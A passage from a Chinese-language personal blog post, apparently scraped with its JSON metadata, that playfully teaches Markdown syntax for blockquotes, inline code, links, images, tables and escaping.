qaq qaq qaq qaq qaq qaq (混乱) 四. 区块区块引用就是加上一个&gt;符号和一个空格 我是一个区块引用 巧了，我也是诶 我不仅有一级引用 我还有二级引用 甚至还有三级 甚至还能做列表 还能嵌套 列表 区块引用 &gt; 我是一个区块引用 &gt; 巧了，我也是诶 &gt; 我不仅有一级引用 &gt; &gt; 我还有二级引用 &gt; &gt; &gt; 甚至还有三级 &gt; &gt; &gt; * 甚至还能做列表 &gt; &gt; &gt; + 还能嵌套 &gt; &gt; 1. 列表 &gt; &gt; &gt; &gt; 区块引用五. 代码scanf()函数~printf()函数~static void main(String[] args) `scanf()`函数~ `printf()`函数~ `static void main(String[] args` 空四格或者一个Tab就是代码区块辣 ----&gt;像这样(这怎么描述啊喂)六. 链接比如酱紫: 滚去问度娘啊！ 滚去问[度娘](http://www.baidu.com/)啊！https://v25bh145.github.io/ &lt;https://v25bh145.github.io/&gt;还有高级(搞♂基)的链接 变量式的： 滚去问度娘啊啊啊 baidu滚去问[我的主页]啊啊啊 主页 七. 图片![alt 属性文本](图片地址) ![alt 属性文本](图片地址 &quot;可选标题&quot;) alt 属性文本 :就是图片的替代文字 可选标题 :title属性的文字 我这里用了这个上传图片网站哇 ![example.png](https://i.loli.net/2019/11/26/eSxz8W2A6rFpMyK.png)当然是可以使用变量的啦 [example][1] [1]: &quot;链接&quot;八. 表格 表头 &lt;-学姐头没了(滑稽) 单元格儿 单元格儿 单元格儿 单元格儿 单元格儿 单元格儿 |表头||&lt;-学姐头没了(滑稽)| | ---- | ---- | ---- | | 单元格儿 | 单元格儿 | 单元格儿 | | 单元格儿 | 单元格儿 | 单元格儿 |表头底下的横线还可以设置表格格式： :—- 居左对齐 —-: 居右对齐 :—-: 居中对齐 ⑨. 另外一些gao♂ji特性一些高级技巧： 支持HTML元素也就是说可以不用学markdown直接开学html哈哈哈 *转义* \\*转义\\* 内嵌数学公式以$$开始，$$结束,格式为TeX或者LaTeX","tags":[{"name":"markdown","slug":"markdown","permalink":"https://v25bh145.github.io/tags/markdown/"},{"name":"随笔","slug":"随笔","permalink":"https://v25bh145.github.io/tags/%E9%9A%8F%E7%AC%94/"}]}]